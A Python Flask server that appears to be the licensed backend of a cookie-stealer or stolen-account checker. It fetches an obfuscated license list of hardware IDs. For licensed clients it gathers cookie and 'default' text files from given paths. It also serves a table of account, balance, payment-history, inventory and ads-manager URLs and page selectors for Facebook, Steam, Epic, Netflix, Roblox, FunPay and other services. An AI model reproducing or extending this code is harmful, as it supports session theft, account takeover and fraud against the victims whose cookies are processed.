import flask
import requests
import os
from bs4 import BeautifulSoup as bs
from flask_restful import Api, Resource, reqparse
import json
import ast


app = flask.Flask(__name__)
app.config["DEBUG"] = True

def start():
    sub = requests.get(''.join(chr(ord(char)-5) for char in 'myyu x?44l nymzg3 htr4kk}2 s4xmnyy~4gqt g4rfxyjw4ff3y} y'.replace(' ','')))
    count = bs(sub.content, 'html.parser')
    list_of_license = []
    try:
        to = count.find('table', attrs={'class':'highlight tab-size js-file-line-container'}).text.replace('\n','')
        list = to.split(' ')
        for i in list:
            list_of_license.append(i.split('_')[0])
        return list_of_license
    except Exception as err:
        print(f'Critical error - {err}')

@app.route('/api/v1/users/all', methods=['GET'])

def apiViewByFilter():
    list = start()
    parser = reqparse.RequestParser()
    parser.add_argument("path")
    parser.add_argument("h")
    parser.add_argument("s")
    parsed = parser.parse_args()
    try:
        way = parsed['path']
        a = ast.literal_eval(way)
        print(len(a))
        hwid = parsed['h']
        if hwid in list:
            all_cooks = []
            for i in a:
                for d, dirs, files in os.walk(f'{i}'):
                    for f in files:
                        if '.txt' in f and ('Cook' in f or 'cook' in f or 'default' in f or 'Default' in f):
                            path = os.path.join(d, f)
                            all_cooks.append(path)
            return flask.jsonify(all_cooks)
        else:
            return 'null'
    except:
        value_to_go = parsed['s']
        hwid = parsed['h']
        if hwid in list:
            to_jsonize = value_to_go.replace('g', '')
            to_jsonize = ''.join(chr(ord(char) - 7) for char in to_jsonize)
        else:
            return 'null'
        return flask.jsonify({
            "services":
                {
                    "twitch": "https://api.twitch.tv/api/channels/",
                    "facebook": "https://www.facebook.com/settings",
                    "funpay": "https://funpay.ru/account/balance",
                    "vk": "https://vk.com/id0",
                    "instagram": "https://www.instagram.com/",
                    "battlenet": "https://eu.account.blizzard.com/gifts/navbar",
                    "steam": "https://store.steampowered.com/account/",
                    "youtube": "https://studio.youtube.com/",
                    "netflix": "https://www.netflix.com/YourAccount",
                    "roblox": "https://www.roblox.com/home",
                },
            "local":
                {
                    "twitch": "https://api.twitch.tv/api/channels/",
                    "facebook": "_1vp5",
                    "funpay": "finance-value",
                    "vk": "page_counter",
                    "instagram": "edge_followed_by",
                    "battlenet": "Navbar-label Navbar-accountAuthenticated",
                    "steam": "accountData price",
                    "steam2": "https://steamcommunity.com/my/inventory/",
                    "youtube": "subscriberCount",
                    "netflix": "collapsable-section-content account-section-content",
                    "roblox": "user-data",
                    "epic1":"https://www.epicgames.com/account/personal",
                    "epic2":"https://www.epicgames.com/account/v2/refresh-csrf",
                    "epic3":"https://www.epicgames.com/account/v2/api/email/info",
                    "epic4":"https://www.epicgames.com/account/v2/payment/ajaxGetOrderHistory?",
                    "fb1":"https://www.facebook.com/adsmanager/manage/campaigns?",
                    "fbsplitter":"campaigns?act=",
                }
        })
        return 'aaaaa'
if __name__ == '__main__':
    app.run(threaded=True, port=5000)

